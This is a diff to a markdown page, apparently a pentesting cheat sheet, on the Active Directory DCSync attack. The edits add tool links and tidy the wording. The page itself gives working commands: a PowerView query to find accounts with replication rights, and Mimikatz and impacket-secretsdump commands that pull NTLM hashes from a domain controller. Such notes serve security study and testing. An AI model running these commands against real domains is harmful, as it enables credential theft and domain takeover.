@@ -2,7 +2,7 @@
 layout: default
 title: DCSync Attack
 parent: Active Directory
-nav_order: 5
+nav_order: 4
 permalink: /ad/dcsync/
 ---
 
@@ -27,20 +27,20 @@ A user who has domain permissions listed above can act like a Domain Controller 
 
 ## Exploit
 
-If you already compromised an initial low privileged account, you can enumerate domain users which can perform DCSync attacks by using `BloodHound` or with following commands.
+If you already compromised an initial low privileged account, you can enumerate domain users which can perform DCSync attacks by using [BloodHound](https://github.com/BloodHoundAD/BloodHound) or [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1).
 
 ```bash
 # With PowerView from a domain joined computer.
 Get-ObjectAcl -DistinguishedName "dc=$company,dc=$com" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
 ```
 
-To obtain the NTLM hash of a single targeted user using a DCSync attack, use commands below.
+To obtain the NTLM hash of a single targeted user using a DCSync attack, use [Mimikatz](https://github.com/gentilkiwi/mimikatz) or [impacket-secretsdump](https://github.com/fortra/impacket).
 
 ```bash
-# From a domain joined Windows computer, with Mimikatz
-lsadump::dcsync /user:$domain\$TARGET
+# From a domain joined Windows computer, with Mimikatz.
+lsadump::dcsync /user:$domain\$target
 
-# From Kali
+# From Kali.
 impacket-secretsdump -just-dc-user $target $domain/$username:$password@$dc_ip
 ```
 
